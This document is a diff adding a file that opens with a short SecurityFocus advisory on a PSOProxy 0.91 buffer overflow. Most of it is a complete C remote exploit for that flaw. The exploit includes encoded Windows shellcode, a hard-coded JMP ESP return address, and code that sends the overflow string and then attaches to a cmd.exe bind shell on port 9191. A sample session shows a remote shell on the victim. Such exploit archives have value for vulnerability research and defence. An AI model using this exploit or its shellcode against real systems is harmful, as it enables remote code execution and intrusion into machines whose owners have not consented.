@@ -1,0 +1,337 @@
+source: http://www.securityfocus.com/bid/9706/info
+ 
+It has been reported that PSOProxy is prone to a remote buffer overflow vulnerability. The issue is due to the insufficient boundary checking.
+ 
+A malicious user may exploit this condition to potentially corrupt sensitive process memory in the affected process and ultimately execute arbitrary code with the privileges of the web server. 
+
+/*
+ * PSOProxy remote stack-based overflow
+ * by Li0n7@voila.fr
+ * Bug found by Donato Ferrante <fdonato@autistici.org>
+ * Spawns cmd.exe on port 9191
+ *
+ * usage: ./PSOProxy-exp -h <victim> -p <port> -t <target>
+ * Platforms supported are:
+ *     0 - XP SP1 FR - PSOProxy 0.91 - 0x77d615b9
+ *
+ * $./PSOProxy-exp -h 192.168.0.1 -p 8080 -t 0
+ * PSOProxy <= 0.91 remote exploit
+ * Bug found by Donato Ferrante <fdonato@autistici.org>
+ * Exploit written by Li0n7 <Li0n7@voila.fr>
+ *
+ * [+] Connected to 192.168.0.1:8080.
+ * [+] Building evil string to send (0x77d615b9).
+ * [+] Here's your shell, have fun!
+ * Microsoft Windows XP [version 5.1.2600]
+ * (C) Copyright 1985-2001 Microsoft Corp.
+ *
+ * C:\Program Files\psoproxy-x86-win32-0.91>
+ *
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <fcntl.h>
+
+#define BACK         9191
+#define D_PORT       8080
+#define SIZE         2048
+#define JMP_ESP      0x77D4643D // USER32.DLL JMP ESP addr
+
+//ripped shellcode from ?
+
+char shellcode[] =
+ "\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33"
+  "\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C"
+  "\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE"
+  "\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB"
+  "\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77"
+  "\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77"
+  "\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77"
+  "\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77"
+  "\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77"
+  "\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77"
+  "\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77"
+  "\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77"
+  "\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77"
+  "\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB"
+  "\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C"
+  "\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0"
+  "\x8A\x88\xAB\x6F\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77"
+  "\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0"
+  "\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB"
+  "\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5"
+  "\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98"
+  "\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE"
+  "\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77"
+  "\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8"
+  "\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF"
+  "\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90"
+  "\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74"
+  "\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4"
+  "\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94"
+  "\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5"
+  "\xD3\x4A\x8C\x88";
+
+struct os_ret_addr
+{
+      int num;
+      char *plat;
+      long ret;
+};
+
+struct os_ret_addr exp_os[]=
+{
+{0,"XP SP1 FR - PSOProxy 0.91", 0x77D615B9}, // USER32.DLL jmp esp addr
+{0,NULL,0},
+};
+
+char *build(long ret);
+int back_connection(long host);
+void send_evil(int fd,char evil[]);
+int set_connection(long host,int port);
+long resolve_host(u_char *host_name);
+void die(char *argv);
+
+int
+main(int argc,char *argv[])
+{
+      int i, option, fd, port = D_PORT;
+      long host = 0, ret = JMP_ESP;
+      char * option_list = "h:p:t:", buffer[SIZE];
+
+      opterr = 0;
+
+      fprintf(stdout,"PSOProxy <= 0.91 remote exploit\r\n");
+      fprintf(stdout,"Bug found by Donato Ferrante <fdonato@autistici.org>\r\n");
+      fprintf(stdout,"Exploit written by Li0n7 <Li0n7@voila.fr>\r\n\n");
+
+      if (argc < 2) die(argv[0]);
+
+      while((option = getopt(argc,argv,option_list)) != -1)
+          switch(option)
+          {
+              case 'h':
+                  host = resolve_host(optarg);
+                  if(!host)
+                  {
+                      fprintf(stderr,"[-] Host address incorrect.\n");
+                      exit(0);
+                  }
+                  break;
+              case 'p':
+                  port = atoi(optarg);
+                  if(port > 65535 || port < 0) exit(1);
+                  break;
+              case 't':
+                  for(i=0; exp_os[i].plat != NULL; i++)
+                  if(atoi(optarg) > i || atoi(optarg) < 0)
+                  {
+                      fprintf(stderr,"Platforms supported are:\n");
+                      for(i=0; exp_os[i].plat != NULL; i++)
+                          fprintf(stderr,"\t%i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);
+                          exit(1);
+                  }
+                  ret = exp_os[atoi(optarg)].ret;
+                  break;
+              case '?':
+                  fprintf(stderr,"[-] option \'%c\' unknown\n",optopt);
+                  die(argv[0]);
+          }
+
+      fd = set_connection(host,port);
+      strncpy(buffer,build(ret),SIZE-1);
+      buffer[SIZE-1] = '\0';
+      send_evil(fd,buffer);
+      back_connection(host);
+      return 0;
+}
+
+char
+*build(long ret)
+{
+      char *buffer,*ptr,*request;
+      int i;
+      long *addr_ptr;
+
+      fprintf(stdout,"[+] Building evil string to send (0x%x).\n",ret);
+      buffer = (char *)malloc(SIZE);
+      request = (char *)malloc(SIZE+4);
+
+      if(!buffer || !request)
+      {
+          fprintf(stderr,"[-] Can't allocate memory, exiting...\n");
+          exit(0);
+      }
+
+      ptr = buffer;
+      memset(ptr,0x41,1024);
+      ptr += 1024;
+
+      addr_ptr = (long *)ptr;
+      *(addr_ptr++) = ret;
+      ptr = (char *)addr_ptr;
+
+      memset(ptr,0x90,20);
+      ptr += 20;
+      memcpy(ptr,shellcode,strlen(shellcode));
+      ptr += strlen(shellcode);
+
+      snprintf(request,SIZE+64,"%s\r\n",buffer);
+      return request;
+}
+
+
+int
+back_connection(long host)
+{
+      struct sockaddr_in s;
+      u_char sock_buf[4096];
+      fd_set fds;
+      int fd,size;
+      char *command="ver\n";
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+      if (fd < 0)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          exit(0);
+      }
+
+      s.sin_family = AF_INET;
+      s.sin_port   = htons(BACK);
+      s.sin_addr.s_addr = host;
+
+      if (connect(fd, (struct sockaddr *)&s, sizeof(struct sockaddr)) == -1)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          close(fd);
+          return 0;
+      }
+
+      fprintf(stdout, "[+] Here's your shell, have fun!\n\n");
+
+      size = send(fd, command, strlen(command), 0);
+      if(size < 0)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          close(fd);
+          exit(0);
+      }
+
+      for (;;)
+      {
+          FD_ZERO(&fds);
+          FD_SET(0, &fds);
+          FD_SET(fd, &fds);
+
+          if (select(255, &fds, NULL, NULL, NULL) == -1)
+          {
+              fprintf(stderr,"[-] %s\n",strerror(errno));
+              close(fd);
+              exit(0);
+          }
+
+          memset(sock_buf, 0, sizeof(sock_buf));
+
+          if (FD_ISSET(fd, &fds))
+          {
+              if (recv(fd, sock_buf, sizeof(sock_buf), 0) == -1)
+              {
+                  fprintf(stderr, "[-] Connection closed by remote host.\n");
+                  close(fd);
+                  exit(0);
+              }
+
+              fprintf(stderr, "%s", sock_buf);
+          }
+
+          if (FD_ISSET(0, &fds))
+          {
+              read(0, sock_buf, sizeof(sock_buf));
+              write(fd, sock_buf, strlen(sock_buf));
+          }
+      }
+      return 0;
+}
+
+void
+send_evil(int fd,char evil[SIZE+64])
+{
+      int size;
+      size = send(fd, evil, strlen(evil), 0);
+      if(size < 0)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          close(fd);
+          exit(0);
+      }
+      sleep(1);
+      return;
+}
+
+
+int
+set_connection(long host,int port)
+{
+      struct sockaddr_in s;
+      struct hostent * hoste;
+      int fd,size;
+
+      fd = socket(AF_INET,SOCK_STREAM,0);
+      if(fd < 0)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          exit(0);
+      }
+
+      s.sin_family = AF_INET;
+      s.sin_addr.s_addr = host;
+      s.sin_port = htons(port);
+
+      if(connect(fd,(struct sockaddr *)&s,sizeof(s)) == -1)
+      {
+          fprintf(stderr,"[-] %s\n",strerror(errno));
+          close(fd);
+          exit(0);
+      }
+
+      fprintf(stdout,"[+] Connected to %s:%i.\n",inet_ntoa(s.sin_addr.s_addr),port);
+
+      sleep(1);
+      return fd;
+
+}
+
+long resolve_host(u_char *host_name)
+{
+      struct in_addr addr;
+      struct hostent *host_ent;
+
+      addr.s_addr = inet_addr(host_name);
+      if (addr.s_addr == -1)
+      {
+          host_ent = gethostbyname(host_name);
+          if (!host_ent) return(0);
+          memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);
+      }
+
+      return(addr.s_addr);
+}
+
+void
+die(char *argv)
+{
+      int i;
+      fprintf(stdout,"usage: %s -h <victim> -p <port> -t <target>\n",argv);
+      fprintf(stderr,"Platforms supported are:\n");
+      for(i=0; exp_os[i].plat != NULL; i++)
+          fprintf(stderr,"\t%i - %s - 0x%x\n",i,exp_os[i].plat,exp_os[i].ret);
+      exit(1);
+}
+
+/* A poil! */
+
